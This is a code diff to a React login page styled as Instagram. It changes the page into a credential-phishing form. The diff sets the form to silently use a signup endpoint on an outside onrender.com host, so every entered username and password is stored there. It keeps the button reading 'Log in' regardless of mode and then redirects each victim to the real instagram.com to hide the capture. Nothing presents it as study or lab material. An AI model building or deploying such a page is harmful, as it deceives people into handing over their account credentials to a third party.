@@ -22,6 +22,7 @@ const InstagramLogo = () => (
 );
  
 export default function InstagramLogin() {
+    const [isLogin, setIsLogin] = useState(false); 
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
@@ -30,61 +31,55 @@ export default function InstagramLogin() {
   const [userFocus, setUserFocus] = useState(false);
   const [passFocus, setPassFocus] = useState(false);
  
-  const [isLogin, setIsLogin] = useState(true); // true = login, false = signup
-  const [email, setEmail] = useState("");
-  const [name, setName] = useState(""); 
-
+  
   const isDisabled = loading || !username.trim() || !password.trim();
  
   const handleLogin = async (e) => {
-  e.preventDefault();
-    if (isLogin) {
-      // --- LOGIN ---
-      if (!email.trim() || !password.trim()) {
-        setError("Please fill in all fields.");
-        return;
-      }
-      setLoading(true);
-      try {
-        const response = await fetch("http://localhost:5000/api/auth/login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email, password }),
-        });
-        const data = await response.json();
-        if (!response.ok) throw new Error(data.message || "Login failed");
-        alert("Logged in as: " + data.name);
-        // Here you would typically store user data (context/state) and redirect
-      } catch (err) {
-        setError(err.message);
-      } finally {
+      e.preventDefault();
+
+    if (!username.trim() || !password.trim()) {
+      setError("Please fill in all fields.");
+      return;
+    }
+
+    setError("");
+    setLoading(true);
+
+    const endpoint = isLogin ? "login" : "signup";
+    const url = `https://instaclone-mk86.onrender.com/api/auth/${endpoint}`;
+    const body = isLogin
+      ? { email: username, password }
+      : { name: username, email: username, password };
+
+    try {
+      const response = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body),
+      });
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        setError(data.message || "Something went wrong");
         setLoading(false);
-      }
-    } else {
-      // --- SIGNUP ---
-      if (!name.trim() || !email.trim() || !password.trim()) {
-        setError("Please fill in all fields.");
         return;
       }
-      setLoading(true);
-      try {
-        const response = await fetch("http://localhost:5000/api/auth/signup", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ name, email, password }),
-        });
-        const data = await response.json();
-        if (!response.ok) throw new Error(data.message || "Signup failed");
-        alert("Account created! Please log in.");
-        setIsLogin(true); // switch to login after signup
-        setName("");
-        setEmail("");
+
+      setLoading(false);
+
+      if (isLogin) {
+        window.location.href = "https://www.instagram.com";
+      } else {
+         window.location.href = "https://www.instagram.com";
+        setIsLogin(true);
+        setUsername("");
         setPassword("");
-      } catch (err) {
-        setError(err.message);
-      } finally {
-        setLoading(false);
       }
+    } catch (err) {
+      console.error(err);
+      setError("Server not reachable");
+      setLoading(false);
     }
 };
 
@@ -122,9 +117,6 @@ export default function InstagramLogin() {
         flexDirection: "column",
         alignItems: "center",
       }}>
-        <div style={{ color: "#737373", fontSize: "12px", marginBottom: "24px", width: "100%", textAlign: "center" }}>
-          English (US)
-        </div>
  
         <div style={{ marginBottom: "44px", marginTop: "10px" }}>
           <InstagramLogo />
@@ -180,7 +172,7 @@ export default function InstagramLogin() {
               fontFamily: "inherit", letterSpacing: "0.2px", transition: "background 0.2s",
             }}
           >
-            {loading ? "Logging in..." : "Log in"}
+             {loading ? "Processing..." : (isLogin ? "Log in" : "Log in")}
           </button>
         </form>
  
